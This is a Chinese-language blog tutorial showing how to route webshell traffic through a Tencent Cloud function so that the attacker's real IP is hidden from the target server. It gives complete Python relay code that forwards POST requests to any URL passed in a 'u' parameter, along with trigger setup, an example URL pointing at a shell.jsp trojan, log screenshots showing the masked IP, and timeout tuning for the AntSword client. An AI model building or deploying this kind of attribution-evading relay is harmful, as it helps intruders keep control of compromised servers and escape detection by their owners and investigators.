# 利用云函数隐藏Webshell真实IP



> 腾讯云自带CDN，我们可以通过腾讯云函数来转发我们的Webshell请求，从而达到隐藏真实IP的目的

## 创建云函数
找到云函数，使用自定义模板
![20220613192232](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192232.png)

![20220613192325](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192325.png)

把下面的代码复制到index.py中
```python
# -*- coding: utf8 -*-
import requests
import json
def geturl(urlstr):
    jurlstr = json.dumps(urlstr)
    dict_url = json.loads(jurlstr)
    return dict_url['u']
def main_handler(event, context):
    url = geturl(event['queryString'])
    postdata = event['body']
    headers=event['headers']
    resp=requests.post(url,data=postdata,headers=headers,verify=False)
    response={
        "isBase64Encoded": False,
        "statusCode": 200,
        "headers": {'Content-Type': 'text/html;charset='+resp.apparent_encoding},
        "body": resp.text
    }
    return response

```
> 注意，运行环境要选Ppython3.6，不然3.7的话得手动上传第三方库(感觉我的同事，不然我一直在坑里出不来呢)


![20220613192414](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192414.png)


部署成功后，点击触发管理->创建触发器：
![20220613192526](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192526.png)

这里需要选择API网关触发：
![20220613192618](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192618.png)


创建完成后，下图可以看到我们的访问路径：
![20220613192747](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613192747.png)


## 使用方法
然后在我们的访问路径后面增加`?u=webshell一句话木马`的地址即可
例如：
```text
https://sxxxxxxxxxxxxxxxxx.gz.apigw.tencentcs.com/release/helloworld-11?u=http://xxxx/shell.jsp

```



使用云函数之前，可以看到我的真实IP：
我这里使用`tail -f xxx.log`来监控的日志，也可以wireshark抓包
访问：`http://10.80.20.57:8080/test/shell.jsp`
![20220614112844](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220614112844.png)
![20220614112807](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220614112807.png)

使用云函数之后，
访问：`https://serxxxxxxxxxxxx.gz.apigw.tencentcs.com/release/forwarded?u=http://xxx/shell.jsp`
![20220614132635](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220614132635.png)

然后我们查看日志：显示的是腾讯云函数CDN的地址

![20220614132911](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220614132911.png)
可以看到IP地址是随机的：
![20220614132852](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220614132852.png)

成功达到目的



## 补充
防止webshell的掉线行为，修改一下超时设置，可以配置为60s  
最好在【函数管理】 -> 【函数配置】里面，最好把执行超时时间设置成和蚁剑里面的超时时间一样或者更长
![20220613193021](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220613193021.png)









---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/  

